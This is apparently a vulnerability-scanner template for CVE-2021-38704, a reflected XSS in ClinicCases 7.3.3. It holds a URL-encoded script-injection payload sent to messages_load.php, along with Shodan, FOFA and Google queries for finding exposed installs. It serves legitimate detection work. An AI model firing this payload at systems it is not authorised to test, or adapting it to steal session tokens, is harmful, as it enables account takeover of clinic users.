http:
- matchers:
  - part: body
    type: word
    words:
    - </script><script>alert(document.domain)</script>
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/cliniccases/lib/php/data/messages_load.php?type=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
id: CVE-2021-38704
info:
  author: alph4byt3
  classification:
    cpe: cpe:2.3:a:cliniccases:cliniccases:7.3.3:*:*:*:*:*:*:*
    cve-id: CVE-2021-38704
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.92784
    epss-score: 0.09961
  description: ClinicCases 7.3.3 is susceptible to multiple reflected cross-site scripting
    vulnerabilities that could allow unauthenticated attackers to introduce arbitrary
    JavaScript by crafting a malicious URL. This can result in account takeover via
    session token theft.
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute malicious scripts in the context of the victim''s browser, leading to
    potential data theft, session hijacking, or defacement of the affected website.

    '
  metadata:
    fofa-query: title="cliniccases",html:"/cliniccases/"
    google-query: intitle:"cliniccases",html:"/cliniccases/"
    max-request: 1
    product: cliniccases
    shodan-query:
    - http.title:"ClinicCases",html:"/cliniccases/"
    - http.title:"cliniccases",html:"/cliniccases/"
    vendor: cliniccases
  name: ClinicCases 7.3.3 Cross-Site Scripting
  reference:
  - https://github.com/sudonoodle/CVE-2021-38704
  - https://nvd.nist.gov/vuln/detail/CVE-2021-38704
  - https://github.com/judsonmitchell/ClinicCases/releases
  - https://github.com/ARPSyndicate/cvemon
  - https://github.com/ARPSyndicate/kenzer-templates
  remediation: 'To mitigate this vulnerability, it is recommended to implement proper
    input validation and sanitization techniques to prevent the execution of malicious
    scripts.

    '
  severity: medium
  tags: cve,cve2021,xss,cliniccases,vuln
